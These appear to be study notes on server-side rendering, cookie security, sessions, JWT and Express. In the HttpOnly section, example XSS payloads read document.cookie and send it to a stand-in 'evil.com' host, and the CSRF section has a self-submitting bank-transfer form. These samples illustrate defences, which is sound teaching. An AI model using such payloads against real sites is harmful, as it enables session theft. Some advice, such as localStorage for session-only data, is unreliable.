
Notes on server-side rendering, state management, and authentication patterns in web applications.

---

## 1. Server-Side Rendering & Templating

### The Problem: Dynamic HTML

Web applications need to generate HTML based on user data, database queries, or external APIs. Building HTML strings in code is tedious and error-prone:

```javascript
// Bad: Building HTML manually
response.write('<h1>Hello, ' + user.name + '</h1>');
response.write('<p>Email: ' + user.email + '</p>');
```

**Solution:** Templating engines separate HTML structure from data.

### EJS (Embedded JavaScript)

EJS is a templating engine that lets you write HTML with embedded JavaScript expressions.

**Installation:**

```bash
npm install ejs
```

**Basic usage:**

```javascript
const ejs = require('ejs');
const html = ejs.render('<h1>Hello <%= name %></h1>', { name: 'World' });
// Result: <h1>Hello World</h1>
```

### EJS Tags

|Tag|Purpose|Output|
|---|---|---|
|`<%= %>`|Output escaped value|Safe - escapes HTML|
|`<%- %>`|Output raw value|Dangerous - no escaping|
|`<% %>`|JavaScript logic|No output|
|`<%# %>`|Comment|No output|

### Security: Escaping vs Raw Output

**Always use `<%=` for user data** to prevent XSS attacks:

```javascript
// User input: <script>alert('XSS')</script>

// Safe (escaped):
<%= userInput %>
// Result: &lt;script&gt;alert('XSS')&lt;/script&gt;

// Dangerous (raw):
<%- userInput %>
// Result: <script>alert('XSS')</script> // Executes!
```

**Use `<%-` only for your own HTML:**

```javascript
// Your safe HTML
const safeHTML = '<strong>Important</strong>';
<%- safeHTML %>  // OK - you control this
```

### Template Files

**Structure:**

```
project/
├── server.js
└── public/
    └── template.ejs
```

**server.js:**

```javascript
const fs = require('fs');
const ejs = require('ejs');

const template = fs.readFileSync('./public/template.ejs', 'utf-8');
const data = { users: ['Alice', 'Bob', 'Charlie'] };
const html = ejs.render(template, data);
```

**template.ejs:**

```html
<ul>
  <% users.forEach(user => { %>
    <li><%= user %></li>
  <% }) %>
</ul>
```

### SSR vs CSR

**Server-Side Rendering (SSR):**

- Server generates complete HTML
- Fast first paint
- SEO-friendly
- Examples: Traditional websites, e-commerce (Amazon)

**Client-Side Rendering (CSR):**

- Server sends JS, browser renders
- Highly interactive
- Slower first paint
- Examples: SPAs, dashboards (Google Sheets)

**When to use SSR:**

- SEO is critical
- Fast initial load needed
- Content-heavy sites
- Limited client-side interactivity

**When to use CSR:**

- Highly interactive applications
- Frequent UI updates
- Already authenticated users
- Mobile apps with web views

### Remember

- **Never** use `<%-` with user input - XSS vulnerability
- EJS separates presentation (HTML) from logic (JavaScript)
- SSR and CSR solve different problems - not mutually exclusive
- Modern approaches (Next.js) combine both

---

## 2. HTTP Cookies

### What Are Cookies?

**Cookies are HTTP headers** containing small pieces of data (key-value pairs) that:

1. Server sends to browser via `Set-Cookie` header
2. Browser stores
3. Browser automatically includes in future requests to same domain

### How Cookies Work

```
1. Client → Server: GET /login
2. Server → Client: Set-Cookie: sessionId=abc123
3. Browser stores: sessionId=abc123
4. Client → Server: GET /profile
                    Cookie: sessionId=abc123
5. Server: "I know this user!"
```

### Setting Cookies

**Server-side (Node.js):**

```javascript
// Basic cookie
response.setHeader('Set-Cookie', 'color=blue');

// With expiration (Max-Age in seconds)
response.setHeader('Set-Cookie', 'color=blue; Max-Age=3600');

// With Expires (specific date)
response.setHeader('Set-Cookie', 'color=blue; Expires=Mon, 1 Jan 2024 00:00:00 GMT');
```

**Client-side (JavaScript):**

```javascript
document.cookie = 'theme=dark; path=/';
console.log(document.cookie); // 'theme=dark'
```

### Cookie Scope

#### Domain Attribute

**Without Domain:**

```javascript
// On example.com:
Set-Cookie: token=abc

// Sent to:
✅ example.com
❌ api.example.com (subdomain)
❌ blog.example.com
```

**With Domain:**

```javascript
// On example.com:
Set-Cookie: token=abc; Domain=example.com

// Sent to:
✅ example.com
✅ api.example.com
✅ blog.example.com
✅ any.subdomain.example.com
```

**Security consideration:** Never set Domain for sensitive cookies - limits exposure to subdomains.

#### Path Attribute

**Controls which URL paths receive the cookie:**

```javascript
Set-Cookie: adminToken=xyz; Path=/admin

// Sent to:
✅ /admin
✅ /admin/users
✅ /admin/settings/profile
❌ /
❌ /blog
```

**Important:** Path is NOT a security feature - JavaScript can still read cookies regardless of path.

### Cookie Lifetime

**Session cookies (no Max-Age/Expires):**

```javascript
Set-Cookie: temp=value
// Deleted when browser closes
```

**Persistent cookies (with Max-Age or Expires):**

```javascript
Set-Cookie: remember=true; Max-Age=2592000  // 30 days
```

**Chrome limitation:** Max cookie lifetime is 400 days.

### Cookie Limitations

|Limitation|Value|
|---|---|
|Size per cookie|~4 KB|
|Cookies per domain|~50-100 (browser dependent)|
|Visibility|User can view/edit in DevTools|
|Security|Not encrypted (unless HTTPS)|

**Implication:** Never store sensitive data directly in cookies!

### Remember

- Cookies are automatically sent with EVERY request to the domain
- Users can view, edit, and delete cookies in DevTools
- Size limit of 4 KB means cookies aren't for large data
- Domain without attribute = more secure (current domain only)
- Path attribute doesn't provide security - only optimization

---

## 3. Cookie Security

### The Security Triad: HttpOnly, Secure, SameSite

Three essential attributes for secure cookies:

```javascript
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

### HttpOnly - Protection Against XSS

**Problem:** JavaScript can read cookies:

```javascript
// Attacker injects this script:
const stolenCookie = document.cookie;
fetch('https://evil.com/steal?cookie=' + stolenCookie);
```

**Solution: HttpOnly**

```javascript
Set-Cookie: sessionId=abc123; HttpOnly

// Now JavaScript cannot access it:
console.log(document.cookie); // '' (empty)
// But browser still sends it automatically!
```

**How it works:**

- Browser stores cookie normally
- Browser sends cookie with requests automatically
- JavaScript `document.cookie` cannot read it

**Example attack prevented:**

```javascript
// Malicious code injected via XSS:
<script>
  fetch('evil.com?cookie=' + document.cookie);
</script>
// With HttpOnly: document.cookie returns nothing
// Attacker gets nothing!
```

### Secure - Protection Against MITM

**Problem:** HTTP traffic is unencrypted, attacker on WiFi can read cookies.

```
User → [Attacker on WiFi] → Server

Attacker sees:
GET /profile HTTP/1.1
Cookie: sessionId=abc123  ← Stolen!
```

**Solution: Secure**

```javascript
Set-Cookie: sessionId=abc123; Secure

// Cookie only sent over HTTPS (encrypted)
// HTTP requests don't include this cookie
```

**How it works:**

- Cookie sent only when connection is `https://`
- `http://` requests won't include this cookie
- Prevents interception on public WiFi

### SameSite - Protection Against CSRF

**Problem: Cross-Site Request Forgery**

```html
<!-- User visits evil.com, which contains: -->
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker-account">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>

<!-- Browser automatically includes bank.com cookies! -->
```

**Solution: SameSite**

Three possible values:

**Strict (most secure):**

```javascript
Set-Cookie: sessionId=abc; SameSite=Strict

// Cookie sent ONLY from same site
// ❌ Link from google.com → bank.com: NO cookie
// ✅ Link from bank.com → bank.com: cookie sent
```

**Lax (balanced):**

```javascript
Set-Cookie: sessionId=abc; SameSite=Lax

// Cookie sent for:
// ✅ Navigation (clicking links): GET requests
// ❌ Forms from other sites: POST requests
// ❌ AJAX from other sites
```

**None (no protection):**

```javascript
Set-Cookie: sessionId=abc; SameSite=None; Secure

// Cookie always sent (requires Secure!)
// Use only when necessary (e.g., embedded iframes)
```

### Security Attributes Comparison

|Attribute|Protects Against|When Cookie Sent|
|---|---|---|
|HttpOnly|XSS|Always (HTTP/HTTPS)|
|Secure|MITM|Only HTTPS|
|SameSite=Strict|CSRF|Only same-site|
|SameSite=Lax|CSRF|Same-site + top-level navigation|
|SameSite=None|Nothing|Always (needs Secure)|

### Real-World Example: Banking Application

```javascript
// Login sets secure session cookie:
res.setHeader('Set-Cookie', 
  'sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600'
);

// Why each attribute:
// - HttpOnly: Prevent XSS stealing session
// - Secure: HTTPS only (bank must use HTTPS)
// - SameSite=Strict: Prevent CSRF attacks
// - Max-Age=3600: 1 hour timeout
```

### Trade-offs: Strict vs Lax

**Strict drawback:**

```
1. User gets email: "Check your balance: [Link]"
2. Clicks link → bank.com
3. Cookie NOT sent (came from email domain)
4. User sees: "Please log in" ← Bad UX!
```

**Lax compromise:**

```
Same scenario:
1. User clicks link from email
2. Cookie IS sent (top-level navigation)
3. User stays logged in ← Good UX!
4. But POST forms from other sites still blocked ← Security maintained
```

**Recommendation:**

- **Banking/Admin:** Use Strict + warn users about links
- **E-commerce/Social:** Use Lax (better UX, still secure)
- **Public APIs:** May need None (with Secure)

### Cookie Prefixes (Advanced)

Special naming conventions that enforce security:

```javascript
// __Secure- prefix: requires Secure attribute
Set-Cookie: __Secure-sessionId=abc; Secure

// __Host- prefix: requires Secure, no Domain, Path=/
Set-Cookie: __Host-sessionId=abc; Secure; Path=/

// Browser rejects cookies with prefix that don't meet requirements
```

### Remember

- **All three attributes (HttpOnly, Secure, SameSite) should be used together** for authentication cookies
- HttpOnly prevents JavaScript access (XSS protection)
- Secure requires HTTPS (MITM protection)
- SameSite prevents cross-site requests (CSRF protection)
- Strict = maximum security, Lax = better UX with good security
- Never use SameSite=None unless absolutely necessary (and always with Secure)

---

## 4. Sessions (Stateful Authentication)

### HTTP is Stateless

**Problem:** Each HTTP request is independent - server doesn't remember previous requests.

```
Request 1: POST /login {user: "alice", pass: "123"}
Request 2: GET /profile
// Server doesn't know Request 2 is from the same user!
```

**Solution:** Use sessions to create "state" over stateless HTTP.

### Session Pattern

**Core idea:** Store an ID in a cookie, store data on the server.

```javascript
// Client cookie:
Cookie: sessionId=abc123

// Server storage:
sessions = {
  'abc123': {
    userId: 5,
    username: 'alice',
    role: 'admin',
    loginTime: '2025-01-10T10:30:00Z'
  }
}
```

### Session Lifecycle

**1. Login (Create Session):**

```javascript
app.post('/login', async (req, res) => {
  const user = await db.users.findOne({ 
    username: req.body.username,
    password: hash(req.body.password) 
  });
  
  if (user) {
    // Generate unique session ID
    const sessionId = generateRandomId(); // e.g., 'abc123'
    
    // Store session data on server
    sessions.set(sessionId, {
      userId: user.id,
      username: user.username,
      role: user.role
    });
    
    // Send session ID to client
    res.cookie('sessionId', sessionId, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 3600000 // 1 hour
    });
    
    res.json({ success: true });
  }
});
```

**2. Authenticated Request (Use Session):**

```javascript
app.get('/profile', (req, res) => {
  const sessionId = req.cookies.sessionId;
  
  // Look up session data
  const sessionData = sessions.get(sessionId);
  
  if (sessionData) {
    // User is authenticated
    res.json({
      username: sessionData.username,
      role: sessionData.role
    });
  } else {
    // No valid session
    res.status(401).json({ error: 'Not authenticated' });
  }
});
```

**3. Logout (Destroy Session):**

```javascript
app.post('/logout', (req, res) => {
  const sessionId = req.cookies.sessionId;
  
  // Remove from server
  sessions.delete(sessionId);
  
  // Remove from client (Max-Age=0)
  res.cookie('sessionId', '', { maxAge: 0 });
  
  res.json({ success: true });
});
```

### Session Storage Options

#### In-Memory (Map)

**For development/learning only:**

```javascript
const sessions = new Map();

// Good for:
✅ Learning
✅ Testing
✅ Single-server development

// Bad for:
❌ Production (data lost on restart)
❌ Multiple servers (sessions not shared)
❌ Large user base (memory limits)
```

#### Redis (Production)

**Industry standard for sessions:**

```javascript
const redis = require('redis');
const client = redis.createClient();

// Store session
await client.set('session:abc123', JSON.stringify({
  userId: 5,
  username: 'alice'
}), 'EX', 3600); // Expires in 1 hour

// Retrieve session
const data = await client.get('session:abc123');
const session = JSON.parse(data);

// Why Redis:
✅ Persists across restarts
✅ Works with multiple servers
✅ Built-in expiration (TTL)
✅ Very fast (in-memory database)
✅ Handles millions of sessions
```

#### PostgreSQL/MySQL

**When you already have a database:**

```sql
CREATE TABLE sessions (
  id VARCHAR(255) PRIMARY KEY,
  user_id INT,
  data JSON,
  expires_at TIMESTAMP
);
```

```javascript
// Store session
await db.sessions.insert({
  id: 'abc123',
  user_id: 5,
  data: { username: 'alice', role: 'admin' },
  expires_at: new Date(Date.now() + 3600000)
});

// Retrieve session
const session = await db.sessions.findOne({ id: 'abc123' });
```

### Session Security

**Session Fixation Attack:**

```javascript
// Attack:
// 1. Attacker gets session ID: xyz789
// 2. Attacker tricks victim into using xyz789
// 3. Victim logs in with xyz789
// 4. Attacker now authenticated as victim!

// Prevention: Regenerate session ID on login
app.post('/login', (req, res) => {
  // ... validate credentials ...
  
  const oldSessionId = req.cookies.sessionId;
  const newSessionId = generateRandomId();
  
  // Copy old session data (if any)
  const oldData = sessions.get(oldSessionId);
  sessions.delete(oldSessionId);
  
  // Create new session
  sessions.set(newSessionId, { userId: user.id });
  
  res.cookie('sessionId', newSessionId, { ... });
});
```

**Session Timeout:**

```javascript
// Absolute timeout (fixed duration)
sessionData.createdAt = Date.now();
sessionData.expiresAt = Date.now() + 3600000; // 1 hour

// Sliding timeout (extends on activity)
app.use((req, res, next) => {
  if (req.cookies.sessionId) {
    const session = sessions.get(req.cookies.sessionId);
    if (session) {
      // Extend expiration on each request
      session.expiresAt = Date.now() + 3600000;
    }
  }
  next();
});
```

### Remember

- Session = ID in cookie + data on server
- Session ID should be cryptographically random
- Always regenerate session ID on login
- Use HttpOnly, Secure, SameSite attributes
- Redis is standard for production sessions
- Clean up expired sessions periodically

---

## 5. JWT (Stateless Authentication)

### The Stateless Alternative

**Problem with sessions:** Server must store data for every user.

**JWT solution:** Encode user data IN the token itself - no server storage needed.

### JWT Structure

Three parts separated by dots: `header.payload.signature`

**Example:**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjUsInJvbGUiOiJhZG1pbiJ9.signature
```

**Decoded:**

```javascript
// Header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Payload (your data)
{
  "userId": 5,
  "username": "alice",
  "role": "admin",
  "exp": 1704902400  // Expiration timestamp
}

// Signature (proves token wasn't tampered with)
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  SECRET_KEY
)
```

### JWT Lifecycle

**1. Login (Generate JWT):**

```javascript
const jwt = require('jsonwebtoken');

app.post('/login', async (req, res) => {
  const user = await db.users.findOne({ 
    username: req.body.username,
    password: hash(req.body.password)
  });
  
  if (user) {
    // Create token with user data
    const token = jwt.sign(
      {
        userId: user.id,
        username: user.username,
        role: user.role
      },
      SECRET_KEY,
      { expiresIn: '1h' }
    );
    
    // Send token in HttpOnly cookie
    res.cookie('token', token, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 3600000
    });
    
    res.json({ success: true });
  }
});
```

**2. Authenticated Request (Verify JWT):**

```javascript
app.get('/profile', (req, res) => {
  try {
    // Verify token
    const decoded = jwt.verify(req.cookies.token, SECRET_KEY);
    
    // Token valid! Use the data
    res.json({
      userId: decoded.userId,
      username: decoded.username,
      role: decoded.role
    });
    
  } catch (error) {
    // Token invalid/expired
    res.status(401).json({ error: 'Invalid token' });
  }
});
```

**3. Protected Route Example:**

```javascript
function requireAuth(req, res, next) {
  try {
    const decoded = jwt.verify(req.cookies.token, SECRET_KEY);
    req.user = decoded;  // Attach user data to request
    next();
  } catch (error) {
    res.status(401).json({ error: 'Authentication required' });
  }
}

// Use middleware
app.get('/admin', requireAuth, (req, res) => {
  if (req.user.role === 'admin') {
    res.json({ message: 'Admin panel' });
  } else {
    res.status(403).json({ error: 'Forbidden' });
  }
});
```

### JWT Security Considerations

**Critical: JWT can be decoded by anyone!**

```javascript
// Anyone can decode JWT payload (no secret needed):
const payload = jwt.decode(token);
// Returns: { userId: 5, role: 'admin' }

// Therefore:
❌ Never store passwords in JWT
❌ Never store credit card numbers
❌ Never store personal sensitive data

✅ Store: userId, username, role, permissions
✅ Store: non-sensitive identification data
```

**Signature prevents tampering:**

```javascript
// Attacker tries to change role:
// Original: { userId: 5, role: 'user' }
// Modified: { userId: 5, role: 'admin' }

// Verification fails - signature doesn't match!
jwt.verify(modifiedToken, SECRET_KEY);
// Throws: JsonWebTokenError: invalid signature
```

### JWT vs Sessions Comparison

|Aspect|JWT (Stateless)|Session (Stateful)|
|---|---|---|
|**Server storage**|None (data in token)|Required (Redis/DB)|
|**Scalability**|Easy (stateless)|Harder (shared storage)|
|**Logout**|Cannot revoke*|Instant (delete session)|
|**Ban user**|Works until expiry*|Instant|
|**Token size**|Large (~200 bytes)|Small (~20 bytes)|
|**Speed**|Fast (no DB lookup)|Slower (DB lookup)|
|**Use case**|APIs, microservices|Traditional web apps|

*Can be mitigated with blacklist, but defeats "stateless" purpose.

### JWT Logout Problem

**The core issue:**

```javascript
// Day 1: User logs in
const token = jwt.sign({ userId: 5 }, SECRET, { expiresIn: '7d' });

// Day 3: User clicks "logout"
// Problem: Token is still valid for 4 more days!

// Server can't "revoke" JWT without:
// - Blacklist (defeats stateless purpose)
// - Short expiration + refresh tokens
```

**Solution: Short-lived Access Token + Refresh Token**

```javascript
// Access token: short-lived (15 min)
const accessToken = jwt.sign(
  { userId: 5, role: 'admin' },
  ACCESS_SECRET,
  { expiresIn: '15m' }
);

// Refresh token: long-lived, stored in DB
const refreshToken = generateRandomId();
await db.refreshTokens.insert({
  token: refreshToken,
  userId: 5,
  expiresAt: Date.now() + 7 * 24 * 60 * 60 * 1000
});

// Send both
res.cookie('accessToken', accessToken, { 
  httpOnly: true, 
  maxAge: 15 * 60 * 1000 
});
res.cookie('refreshToken', refreshToken, { 
  httpOnly: true, 
  maxAge: 7 * 24 * 60 * 60 * 1000 
});
```

**Refresh flow:**

```javascript
// When access token expires:
app.post('/refresh', async (req, res) => {
  const { refreshToken } = req.cookies;
  
  // Check if refresh token valid (in DB)
  const tokenData = await db.refreshTokens.findOne({ 
    token: refreshToken,
    expiresAt: { $gt: Date.now() }
  });
  
  if (tokenData) {
    // Check if user banned
    const user = await db.users.findOne({ id: tokenData.userId });
    if (user.banned) {
      await db.refreshTokens.delete({ token: refreshToken });
      return res.status(403).json({ error: 'User banned' });
    }
    
    // Issue new access token
    const newAccessToken = jwt.sign(
      { userId: user.id, role: user.role },
      ACCESS_SECRET,
      { expiresIn: '15m' }
    );
    
    res.cookie('accessToken', newAccessToken, { ... });
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});
```

**Logout with refresh tokens:**

```javascript
app.post('/logout', async (req, res) => {
  // Delete refresh token from DB
  await db.refreshTokens.delete({ 
    token: req.cookies.refreshToken 
  });
  
  // Clear both cookies
  res.cookie('accessToken', '', { maxAge: 0 });
  res.cookie('refreshToken', '', { maxAge: 0 });
  
  res.json({ success: true });
});

// Now logout is effective:
// - Access token expires in 15 min anyway
// - Refresh token deleted, can't get new access token
```

### When to Use JWT

**Good use cases:**

- APIs consumed by mobile apps
- Microservices architecture (no shared session store)
- Third-party API access (OAuth)
- High performance requirements (no DB lookup)
- Truly stateless systems

**Bad use cases:**

- Traditional server-rendered websites
- Systems requiring instant logout/ban
- When session data changes frequently
- High security requirements (banking)

### Remember

- JWT is **stateless** - no server storage needed
- JWT payload can be decoded by anyone - don't store secrets
- Signature prevents tampering, not reading
- Short-lived JWT + refresh token = best practice
- Use HttpOnly cookie for JWT, NOT localStorage (XSS risk)
- For instant logout, use sessions instead

---

## 6. Express.js

### Why Express?

Node.js HTTP module is powerful but verbose. Express simplifies common web server tasks.

### Simplified Routing

**Without Express:**

```javascript
const http = require('http');
const url = require('url');

http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);
  
  if (parsedUrl.pathname === '/' && req.method === 'GET') {
    res.writeHead(200, {'Content-Type': 'text/html'});
    res.end('Home');
  } else if (parsedUrl.pathname === '/about' && req.method === 'GET') {
    res.writeHead(200, {'Content-Type': 'text/html'});
    res.end('About');
  } else if (parsedUrl.pathname === '/api/users' && req.method === 'POST') {
    // Handle POST...
  } else {
    res.writeHead(404);
    res.end('Not found');
  }
}).listen(3000);
```

**With Express:**

```javascript
const express = require('express');
const app = express();

app.get('/', (req, res) => res.send('Home'));
app.get('/about', (req, res) => res.send('About'));
app.post('/api/users', (req, res) => { /* Handle POST */ });

app.listen(3000);
```

### Key Express Simplifications

|Task|Vanilla Node|Express|
|---|---|---|
|**Routing**|if/else chains|`app.get('/path')`|
|**POST body**|Stream handling|`req.body`|
|**Cookies**|Manual parsing|`req.cookies`|
|**URL params**|String manipulation|`req.params.id`|
|**JSON response**|`JSON.stringify()` + headers|`res.json()`|
|**Static files**|Manual `fs` + MIME types|`express.static()`|

### Middleware Pattern

**Middleware = function that runs for EVERY matching request**

```javascript
// Logging middleware
app.use((req, res, next) => {
  console.log(`${req.method} ${req.url}`);
  next(); // Pass to next middleware/route
});

// Authentication middleware
function requireAuth(req, res, next) {
  if (req.session && req.session.userId) {
    next(); // User authenticated, continue
  } else {
    res.status(401).send('Unauthorized');
  }
}

// Use middleware for specific routes
app.get('/admin', requireAuth, (req, res) => {
  res.send('Admin panel');
});
```

### Express with Sessions

```javascript
const express = require('express');
const session = require('express-session');
const cookieParser = require('cookie-parser');

const app = express();

// Middleware setup
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(session({
  secret: 'your-secret-key',
  resave: false,
  saveUninitialized: false,
  cookie: { 
    httpOnly: true,
    secure: true,
    maxAge: 3600000 // 1 hour
  }
}));

// Routes
app.get('/', (req, res) => {
  res.send('Home');
});

app.post('/login', (req, res) => {
  // Validate credentials...
  req.session.userId = user.id;
  req.session.username = user.username;
  res.json({ success: true });
});

app.get('/profile', (req, res) => {
  if (req.session.userId) {
    res.json({ 
      username: req.session.username 
    });
  } else {
    res.status(401).json({ error: 'Not authenticated' });
  }
});

app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      res.status(500).json({ error: 'Logout failed' });
    } else {
      res.json({ success: true });
    }
  });
});

app.listen(3000);
```

### Remember

- Express is a thin layer over Node.js HTTP module
- Middleware runs in order - sequence matters
- `next()` passes control to next middleware/route
- `express-session` handles sessions automatically
- Express doesn't enforce structure - organize yourself

---

## 7. Practical Patterns & Best Practices

### Authentication Cookie Setup

**Production-ready configuration:**

```javascript
// Session-based
res.cookie('sessionId', sessionId, {
  httpOnly: true,      // Prevent XSS
  secure: true,        // HTTPS only
  sameSite: 'strict',  // Prevent CSRF
  maxAge: 3600000,     // 1 hour
  path: '/'
});

// JWT-based
res.cookie('accessToken', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 900000       // 15 minutes
});

res.cookie('refreshToken', refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 604800000    // 7 days
});
```

### Data Storage Decision Tree

```
Need to store data?
│
├─ Authentication data?
│  ├─ Need instant logout/ban? → Session (Redis)
│  └─ API for mobile/microservices? → JWT (HttpOnly cookie)
│
├─ User preferences (theme, language)?
│  ├─ Needs to persist? → Cookie
│  └─ Session-only? → localStorage
│
└─ Shopping cart?
   ├─ Guest user? → localStorage
   └─ Logged in? → Database
```

### Common Mistakes

**Mistake 1: localStorage for auth tokens**

```javascript
// ❌ VULNERABLE TO XSS
localStorage.setItem('token', jwt);

// ✅ SAFE
res.cookie('token', jwt, { httpOnly: true });
```

**Mistake 2: Exposing sensitive data in JWT**

```javascript
// ❌ BAD
const token = jwt.sign({ 
  userId: 5, 
  password: 'secret123',  // NEVER!
  creditCard: '1234-5678' // NEVER!
}, SECRET);

// ✅ GOOD
const token = jwt.sign({
  userId: 5,
  role: 'admin',
  permissions: ['read', 'write']
}, SECRET);
```

**Mistake 3: Setting Domain for auth cookies**

```javascript
// ❌ RISKY - all subdomains get cookie
res.cookie('sessionId', id, { 
  domain: 'example.com' 
});

// ✅ SAFE - only current domain
res.cookie('sessionId', id);
```

**Mistake 4: Long JWT without refresh token**

```javascript
// ❌ CAN'T REVOKE
const token = jwt.sign(data, SECRET, { 
  expiresIn: '30d' 
});

// ✅ SHORT JWT + REFRESH
const accessToken = jwt.sign(data, SECRET, { 
  expiresIn: '15m' 
});
const refreshToken = generateAndStoreInDB();
```

### Session vs JWT Decision Matrix

|Requirement|Use Session|Use JWT|
|---|---|---|
|Instant logout required|✅ Yes|❌ No (workaround needed)|
|Multiple servers|⚠️ Need shared Redis|✅ Yes (stateless)|
|Mobile app|❌ No|✅ Yes|
|Data changes frequently|✅ Yes|❌ No|
|Microservices|❌ No|✅ Yes|
|High security (banking)|✅ Yes|⚠️ Maybe|
|Traditional website|✅ Yes|⚠️ Maybe|

### Remember

- **For web apps:** Session + Redis is safest default
- **For APIs:** JWT + short expiry + refresh token
- **Always:** HttpOnly + Secure + SameSite for auth cookies
- **Never:** Store passwords, credit cards, secrets in JWT
- **Never:** Use localStorage for auth tokens

---

## 8. Testing (Brief Overview)

### Testing HTTP Servers with Mocha + Chai

**Installation:**

```bash
npm install --save-dev mocha chai chai-http
```

**Basic test structure:**

```javascript
const chai = require('chai');
const chaiHttp = require('chai-http');
const server = require('../server'); // Your server

chai.use(chaiHttp);
chai.should();

describe('Authentication', () => {
  it('should login with valid credentials', (done) => {
    chai.request(server)
      .post('/login')
      .send({ username: 'alice', password: '123' })
      .end((err, res) => {
        res.should.have.status(200);
        res.body.should.have.property('success').eql(true);
        res.should.have.cookie('sessionId');
        done();
      });
  });
  
  it('should reject invalid credentials', (done) => {
    chai.request(server)
      .post('/login')
      .send({ username: 'alice', password: 'wrong' })
      .end((err, res) => {
        res.should.have.status(401);
        done();
      });
  });
  
  it('should access protected route when authenticated', (done) => {
    // First login
    chai.request(server)
      .post('/login')
      .send({ username: 'alice', password: '123' })
      .end((err, res) => {
        const cookie = res.headers['set-cookie'][0];
        
        // Then access protected route
        chai.request(server)
          .get('/profile')
          .set('Cookie', cookie)
          .end((err, res) => {
            res.should.have.status(200);
            res.body.should.have.property('username');
            done();
          });
      });
  });
});
```

**Run tests:**

```bash
npx mocha test/auth.test.js
```

---

## 9. Summary & Key Takeaways

### Critical Security Principles

1. **Never trust client data** - validate everything
2. **Always use HttpOnly for auth cookies** - prevent XSS
3. **Always use Secure** - HTTPS only
4. **Always use SameSite** - prevent CSRF
5. **Never store secrets in JWT** - anyone can decode payload
6. **Never use localStorage for auth** - XSS vulnerability

### Technology Comparison

|Aspect|Session|JWT|
|---|---|---|
|**State**|Stateful (server storage)|Stateless (self-contained)|
|**Logout**|Instant|Delayed (until expiry)|
|**Scalability**|Needs shared storage|Easy to scale|
|**Security**|Can revoke immediately|Cannot revoke without blacklist|
|**Size**|Small (~20 bytes)|Large (~200 bytes)|
|**Best for**|Traditional web apps|APIs, microservices|

### When to Use What

**EJS/SSR:**

- Content-heavy websites
- SEO is critical
- Server-side data processing

**Sessions:**

- Traditional web applications
- Need instant logout/ban
- High security requirements

**JWT:**

- Mobile APIs
- Microservices
- Stateless architecture

**Express:**

- Any Node.js web application
- Simplifies routing and middleware
- Industry standard

### Common Patterns

**Pattern 1: Session-based Web App**

```javascript
Express + express-session + Redis + EJS templates
```

**Pattern 2: JWT API**

```javascript
Express + JWT (HttpOnly cookies) + Short expiry + Refresh tokens
```

**Pattern 3: Hybrid**

```javascript
Express + Session for web + JWT for mobile API
```

---

## Quick Reference

### Cookie Security Checklist

```javascript
✅ HttpOnly: true    // Prevent JavaScript access
✅ Secure: true      // HTTPS only
✅ SameSite: 'strict' or 'lax'
✅ maxAge or expires // Set expiration
❌ No Domain for auth cookies
❌ No secrets in cookie values
```

### Session Implementation Checklist

```javascript
✅ Use Redis for production
✅ Generate cryptographically random session IDs
✅ Regenerate session ID on login
✅ Set expiration time
✅ Clean up expired sessions
✅ Use HttpOnly, Secure, SameSite
```

### JWT Implementation Checklist

```javascript
✅ Store in HttpOnly cookie (NOT localStorage)
✅ Short expiration (15-30 min)
✅ Use refresh tokens for longer sessions
✅ Never store secrets in payload
✅ Verify signature on every request
✅ Handle token expiration gracefully
```

---

## Related Topics & Further Reading

- **OAuth 2.0:** Industry standard for third-party authentication
- **Password hashing:** bcrypt, Argon2
- **CSRF tokens:** Additional protection layer
- **Rate limiting:** Prevent brute force attacks
- **2FA/MFA:** Two-factor authentication
- **Security headers:** HSTS, X-Frame-Options, CSP

---

**End of Notes**